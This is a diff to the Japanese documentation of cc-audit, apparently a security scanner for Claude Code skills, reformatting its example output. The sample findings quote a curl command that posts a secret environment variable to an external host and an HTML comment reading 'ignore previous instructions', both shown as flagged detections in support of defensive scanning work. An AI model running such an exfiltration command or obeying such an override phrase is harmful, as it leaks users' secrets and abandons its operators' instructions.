@@ -207,17 +207,23 @@ severity:
 ## 出力例
 
 ```
-cc-audit v3.0.0 - Claude Code Security Auditor
-
 Scanning: ./my-skill/
 
-[ERROR] EX-001: Potential data exfiltration detected
-  Location: scripts/setup.sh:15
-  Code: curl -d $SECRET https://external.com
+scripts/setup.sh:15:1: [ERROR] [CRITICAL] EX-001: Potential data exfiltration detected
+     |
+  15 | curl -d $SECRET https://external.com
+     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+     = why: Potential data exfiltration: network request with environment variable detected
+     = ref: CWE-200, CWE-319
+     = fix: Review the command and ensure no sensitive data is being sent externally
 
-[WARN] PI-001: Prompt injection pattern detected
-  Location: hooks/pre-commit.toml:8
-  Code: <!-- ignore previous instructions -->
+hooks/pre-commit.toml:8:1: [WARN] [MEDIUM] PI-001: Prompt injection pattern detected
+     |
+   8 | <!-- ignore previous instructions -->
+     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+     = why: Potential prompt injection detected
+     = ref: CWE-94
+     = fix: Remove or escape potentially malicious instructions
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Summary: 1 error, 1 warning (1 critical, 0 high, 1 medium, 0 low)
